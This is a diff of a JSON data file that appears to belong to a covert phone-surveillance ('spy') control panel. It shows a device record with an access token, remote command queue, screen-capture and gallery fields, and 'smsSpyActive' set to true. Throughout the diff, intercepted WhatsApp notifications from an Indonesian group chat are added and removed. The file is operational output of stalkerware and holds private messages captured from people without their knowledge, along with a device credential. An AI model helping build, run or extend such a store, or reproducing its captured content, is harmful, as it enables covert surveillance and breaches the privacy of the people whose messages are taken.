@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775046356472,
+    "lastSeen": 1775046359525,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (13633 pesan): ~ Bot",
+        "content": "❌ Jawaban Salah untuk soal ini. Coba lagi!",
+        "time": "01/04 20:25",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775046360251
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎15808 pesan dari 10 chat",
+        "time": "01/04 20:25",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775046358358
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (13632 pesan): ~ Fegg",
@@ -4003,22 +4019,6 @@
         "time": "01/04 20:13",
         "pkg": "com.whatsapp",
         "receivedAt": 1775045587221
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎15694 pesan dari 10 chat",
-        "time": "01/04 20:13",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775045587208
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎15693 pesan dari 10 chat",
-        "time": "01/04 20:13",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775045585194
       }
     ],
     "galleryPhotos": [],
@@ -4065,6 +4065,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (13633 pesan): ~ Bot",
+        "content": "❌ Jawaban Salah untuk soal ini. Coba lagi!",
+        "time": "01/04 20:25",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775046360344
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎15808 pesan dari 10 chat",
+        "time": "01/04 20:25",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775046358397
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (13632 pesan): ~ Fegg",
+        "content": "tindakan silang",
+        "time": "01/04 20:25",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775046358381
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -8040,30 +8064,6 @@
         "time": "01/04 20:13",
         "pkg": "com.whatsapp",
         "receivedAt": 1775045587247
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (13487 pesan): ~ Bot",
-        "content": "𐔈⃘ ֹ ׅ 🍓 ֹ Cek Limit ֹ ׅ ୫\n۫ ╰╼ ׅ ֹ𔖰᷼𔖮 INFO LIMIT\n╭╼─┈───┈──⏣╼╯\n┆✿᪲ ׄ𖹭₊ Total Harian : 169\n┆✿᪲ ׄ𖹭₊ Terpakai : 53\n┆✿᪲ ׄ𖹭₊ Sisa : 116\n┆✿᪲ ׄ𖹭₊ Claim : Sudah\n╰─╼𔕬─┈───┈───┈\n\n Catatan:\n┆✿᪲ ׄ𖹭₊ • Limit reset jam 00:00 WIB\n┆✿᪲ ׄ𖹭₊ • Gunakan .claim untuk bonus 5 limit\n┆✿᪲ ׄ𖹭₊ • Upgrade ke premium dengan .prem\n╰─╼𔕬─┈───┈───┈",
-        "time": "01/04 20:13",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775045587148
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎15693 pesan dari 10 chat",
-        "time": "01/04 20:13",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775045585212
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (13486 pesan): ~ r",
-        "content": ".ceklimit",
-        "time": "01/04 20:13",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775045585137
       }
     ],
     "galleryPhotos": [],
